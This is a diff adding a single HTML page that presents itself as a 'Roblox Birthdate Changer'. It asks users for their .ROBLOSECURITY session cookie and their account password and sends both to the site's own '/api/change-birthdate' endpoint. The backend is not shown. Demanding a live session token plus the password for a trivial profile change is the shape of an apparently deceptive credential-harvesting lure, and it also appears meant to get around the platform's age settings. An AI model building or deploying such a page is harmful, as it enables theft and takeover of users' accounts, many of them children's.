@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Birthdate Changer</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #0f0f13;
+            color: #e0e0e0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .card {
+            background: #1a1a24;
+            border: 1px solid #2a2a3a;
+            border-radius: 16px;
+            padding: 36px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 28px;
+        }
+
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #00b4ff, #0066ff);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        .logo h1 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .logo p {
+            font-size: 12px;
+            color: #666;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #999;
+            margin-bottom: 6px;
+            margin-top: 16px;
+        }
+
+        input, select {
+            width: 100%;
+            background: #12121a;
+            border: 1px solid #2a2a3a;
+            border-radius: 8px;
+            padding: 10px 14px;
+            color: #e0e0e0;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus, select:focus {
+            border-color: #0066ff;
+        }
+
+        input::placeholder { color: #444; }
+
+        .row {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+        }
+
+        .btn {
+            width: 100%;
+            margin-top: 24px;
+            padding: 12px;
+            background: linear-gradient(135deg, #0066ff, #00b4ff);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s, transform 0.1s;
+        }
+
+        .btn:hover { opacity: 0.9; }
+        .btn:active { transform: scale(0.98); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+        .logs {
+            margin-top: 20px;
+            background: #0d0d14;
+            border: 1px solid #2a2a3a;
+            border-radius: 8px;
+            padding: 14px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-height: 260px;
+            overflow-y: auto;
+            display: none;
+        }
+
+        .log-line {
+            padding: 2px 0;
+            line-height: 1.6;
+            color: #aaa;
+        }
+
+        .log-line.success { color: #4ade80; }
+        .log-line.error { color: #f87171; }
+        .log-line.info { color: #60a5fa; }
+
+        .result {
+            margin-top: 16px;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+            text-align: center;
+        }
+
+        .result.success {
+            background: rgba(74, 222, 128, 0.1);
+            border: 1px solid rgba(74, 222, 128, 0.3);
+            color: #4ade80;
+        }
+
+        .result.error {
+            background: rgba(248, 113, 113, 0.1);
+            border: 1px solid rgba(248, 113, 113, 0.3);
+            color: #f87171;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        select option { background: #1a1a24; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <div class="logo-icon">🎂</div>
+            <div>
+                <h1>Birthdate Changer</h1>
+                <p>Roblox Account Tool</p>
+            </div>
+        </div>
+
+        <label>Roblox Cookie (.ROBLOSECURITY)</label>
+        <input type="password" id="cookie" placeholder="Paste your .ROBLOSECURITY cookie..." />
+
+        <label>Account Password</label>
+        <input type="password" id="password" placeholder="Your Roblox password..." />
+
+        <label>New Birthdate</label>
+        <div class="row">
+            <select id="month">
+                <option value="">Month</option>
+                <option value="1">January</option>
+                <option value="2">February</option>
+                <option value="3">March</option>
+                <option value="4">April</option>
+                <option value="5">May</option>
+                <option value="6">June</option>
+                <option value="7">July</option>
+                <option value="8">August</option>
+                <option value="9">September</option>
+                <option value="10">October</option>
+                <option value="11">November</option>
+                <option value="12">December</option>
+            </select>
+            <select id="day">
+                <option value="">Day</option>
+                <script>for(let i=1;i<=31;i++) document.write(`<option value="${i}">${i}</option>`);</script>
+            </select>
+            <select id="year">
+                <option value="">Year</option>
+                <script>
+                    const currentYear = new Date().getFullYear();
+                    for(let y = currentYear - 5; y >= currentYear - 100; y--) {
+                        document.write(`<option value="${y}">${y}</option>`);
+                    }
+                </script>
+            </select>
+        </div>
+
+        <button class="btn" id="submitBtn" onclick="changeBirthdate()">
+            Change Birthdate
+        </button>
+
+        <div class="result" id="result"></div>
+        <div class="logs" id="logs"></div>
+    </div>
+
+    <script>
+        async function changeBirthdate() {
+            const cookie = document.getElementById('cookie').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const birthMonth = document.getElementById('month').value;
+            const birthDay = document.getElementById('day').value;
+            const birthYear = document.getElementById('year').value;
+
+            if (!cookie || !password || !birthMonth || !birthDay || !birthYear) {
+                showResult(false, 'Please fill in all fields.');
+                return;
+            }
+
+            const btn = document.getElementById('submitBtn');
+            const logsEl = document.getElementById('logs');
+            const resultEl = document.getElementById('result');
+
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span>Changing...';
+            logsEl.style.display = 'block';
+            logsEl.innerHTML = '';
+            resultEl.style.display = 'none';
+
+            try {
+                const resp = await fetch('/api/change-birthdate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cookie, password, birthMonth, birthDay, birthYear })
+                });
+
+                const data = await resp.json();
+
+                if (data.logs) {
+                    data.logs.forEach(line => addLog(line));
+                }
+
+                if (data.success) {
+                    showResult(true, `✅ Birthdate changed successfully!`);
+                } else {
+                    showResult(false, `❌ ${data.error || 'Unknown error'}`);
+                    if (data.details) addLog(`Details: ${data.details}`, 'error');
+                }
+            } catch (err) {
+                showResult(false, `❌ Server error: ${err.message}`);
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = 'Change Birthdate';
+            }
+        }
+
+        function addLog(line, type = '') {
+            const logsEl = document.getElementById('logs');
+            const div = document.createElement('div');
+            div.className = 'log-line' + (
+                line.includes('✅') ? ' success' :
+                line.includes('❌') || type === 'error' ? ' error' :
+                line.includes('🔄') ? ' info' : ''
+            );
+            div.textContent = line;
+            logsEl.appendChild(div);
+            logsEl.scrollTop = logsEl.scrollHeight;
+        }
+
+        function showResult(success, message) {
+            const el = document.getElementById('result');
+            el.className = 'result ' + (success ? 'success' : 'error');
+            el.textContent = message;
+            el.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
